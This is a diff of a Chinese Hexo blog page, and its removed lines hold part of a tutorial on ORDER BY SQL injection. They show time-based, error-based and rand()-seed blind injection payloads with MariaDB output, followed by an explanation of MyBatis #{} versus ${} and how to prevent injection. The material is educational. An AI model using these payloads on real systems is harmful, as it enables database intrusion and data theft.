-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from user order by (if(substr((select username from user limit 0,1),1,1)=&#x27;1&#x27;,sleep(1),1));</span><br><span class="line">+------------------+------------+</span><br><span class="line">| username         | password   |</span><br><span class="line">+------------------+------------+</span><br><span class="line">| Nakajima Ayato   | 9CXLGSEWDO |</span><br><span class="line">| Mildred Green    | r8ZPbvDXBC |</span><br><span class="line">| Ito Momoe        | qao7ysP90D |</span><br><span class="line">| Lo On Kay        | x8rGVqTQqd |</span><br><span class="line">| Kobayashi Sakura | lYiv7UO8Yo |</span><br><span class="line">+------------------+------------+</span><br><span class="line">5 rows in set (0.002 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [test]&gt; select * from user order by (if(substr((select username from user limit 0,1),1,1)=&#x27;N&#x27;,sleep(1),1));</span><br><span class="line">+------------------+------------+</span><br><span class="line">| username         | password   |</span><br><span class="line">+------------------+------------+</span><br><span class="line">| Nakajima Ayato   | 9CXLGSEWDO |</span><br><span class="line">| Mildred Green    | r8ZPbvDXBC |</span><br><span class="line">| Ito Momoe        | qao7ysP90D |</span><br><span class="line">| Lo On Kay        | x8rGVqTQqd |</span><br><span class="line">| Kobayashi Sakura | lYiv7UO8Yo |</span><br><span class="line">+------------------+------------+</span><br><span class="line">5 rows in set (5.004 sec)</span><br></pre></td></tr></table></figure>
-
-<p>可以看到，当if语句成立时返回的时间为5s，但是不成立时为0.002s</p>
-<p>这是基于时间的盲注。</p>
-<p>还可以利用其它的方式来进行盲注</p>
-<p>例如：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> if(substr((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">user</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,(<span class="keyword">select</span> host <span class="keyword">from</span> mysql.user));</span><br><span class="line">ERROR <span class="number">1242</span> (<span class="number">21000</span>): Subquery <span class="keyword">returns</span> more than <span class="number">1</span> <span class="type">row</span></span><br></pre></td></tr></table></figure>
-
-<p>如果if语句错误就会返回<code>ERROR 1242 (21000): Subquery returns more than 1 row</code>，当if成立时就会返回正常页面，可以通过返回的情况来判断。</p>
-<h3 id="rand-盲注"><a href="#rand-盲注" class="headerlink" title="rand()盲注"></a>rand()盲注</h3><p>原理和order by大差不差，就是rand()会产生一个0-1之间的随机数，我们给一个固定的种子就会生成一个固定的数，所以我们控制rand的种子就可以造成排序的结果不同。</p>
-<p>比如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rand(1)</span><br><span class="line">rand(0)</span><br><span class="line">rand(1=1)</span><br><span class="line">rand(lenth(database())=8)</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
-
-<h3 id="和-符号的区别"><a href="#和-符号的区别" class="headerlink" title="#和$符号的区别"></a>#和$符号的区别</h3><p><strong>#{}</strong> </p>
-<p>使用#{}意味着使用的预编译的语句，即在使用jdbc时的preparedStatement，sql语句中如果存在参数则会使用?作占位符，我们知道这种方式可以防止sql注入，并且在使用#{}时形成的sql语句，已经带有引号，例，select * from table1 where id=#{id} 在调用这个语句时我们可以通过后台看到打印出的sql为：select * from table1 where id=’2’ 加入传的值为2.也就是说在组成sql语句的时候把参数默认为字符串。</p>
-<p><strong>${}</strong></p>
-<p>使用${}时的sql不会当做字符串处理，是什么就是什么，如上边的语句：select * from table1 where id=${id} 在调用这个语句时控制台打印的为：select * from table1 where id=2 ，假设传的参数值为2</p>
-<p>从上边的介绍可以看出这两种方式的区别，我们最好是能用#{}则用它，因为它可以防止sql注入，且是预编译的，在需要原样输出时才使用${}，如，</p>
-<p>select * from ${tableName} order by ${id} 这里需要传入表名和按照哪个列进行排序 ，加入传入table1、id 则语句为：select * from table1 order by id</p>
-<p>如果是使用#{} 则变成了select * from ‘table1’ order by ‘id’ 我们知道这样就不对了。</p>
-<p>另，在使用以下的配置时，必须使用#{}</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=&quot;selectMessageByIdI&quot; parameterType=&quot;int&quot; resultType=&quot;Message&quot;&gt;</span><br><span class="line">         </span><br><span class="line">         select * from message where id=#&#123;id&#125;;</span><br><span class="line">     &lt;/select&gt;</span><br></pre></td></tr></table></figure>
-
-<p>在parameterType是int时，sql语句中必须是#{}。</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p> <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/360733.html">关于Java中order by注入详解</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1440,14 +1391,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">52</span>
+          <span class="site-state-item-count">54</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-count">22</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -1489,12 +1440,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
     </span>
-    <span title="站点总字数">189k</span>
+    <span title="站点总字数">247k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">2:52</span>
+    <span title="站点阅读时长">3:44</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
